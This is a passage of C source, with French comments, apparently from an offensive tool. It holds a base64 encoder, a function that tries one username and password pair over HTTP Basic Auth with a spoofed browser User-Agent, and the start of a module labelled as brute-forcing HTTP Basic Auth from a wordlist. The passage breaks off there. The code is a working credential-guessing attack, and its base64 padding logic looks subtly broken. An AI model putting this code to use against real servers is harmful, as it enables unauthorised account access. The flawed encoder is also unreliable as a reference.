/* Encode base64 (pour Authorization: Basic) */
static const char b64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void base64_encode(const unsigned char *in, size_t in_len, char *out) {
    size_t i = 0, j = 0;
    while (i < in_len) {
        unsigned char b0 = in[i++];
        unsigned char b1 = (i < in_len) ? in[i++] : 0;
        unsigned char b2 = (i < in_len) ? in[i++] : 0;
        out[j++] = b64_chars[b0 >> 2];
        out[j++] = b64_chars[((b0 & 3) << 4) | (b1 >> 4)];
        out[j++] = (i - 1 < in_len || in_len % 3 > 1) ? b64_chars[((b1 & 0xf) << 2) | (b2 >> 6)] : '=';
        out[j++] = (i - 1 < in_len || in_len % 3 > 2) ? b64_chars[b2 & 0x3f] : '=';
    }
    out[j] = '\0';
}

static int http_basic_auth_try(const char *host, int port,
                                const char *path,
                                const char *user, const char *pass) {
    int sock;
    struct sockaddr_in sa;
    char request[MAX_LINE * 2];
    char response[MAX_LINE];
    char creds[512];
    char b64[700];

    snprintf(creds, sizeof creds, "%s:%s", user, pass);
    base64_encode((unsigned char*)creds, strlen(creds), b64);

    snprintf(request, sizeof request,
        "GET %s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "Authorization: Basic %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Connection: close\r\n\r\n",
        path, host, b64);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    /* Timeout */
    struct timeval tv = {3, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);

    struct hostent *he = gethostbyname(host);
    if (!he) { close(sock); return -2; }

    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    memcpy(&sa.sin_addr, he->h_addr, he->h_length);

    if (connect(sock, (struct sockaddr*)&sa, sizeof sa) < 0) {
        close(sock); return -3;
    }
    send(sock, request, strlen(request), 0);
    int n = recv(sock, response, sizeof response - 1, 0);
    close(sock);
    if (n <= 0) return -4;
    response[n] = '\0';

    /* Cherche HTTP 200 ou 301 (succès), 401 (échec) */
    if (strstr(response, "HTTP/1.") &&
        !strstr(response, " 401 ") &&
        !strstr(response, " 403 ")) {
        return 1; /* succès */
    }
    return 0;
}

static void module_brute(const char *url, const char *wordlist_path) {
    printf(MAG "\n" BANNER_LINE "\n");
    printf("  MODULE: BRUTE FORCE HTTP BASIC AUTH\n");
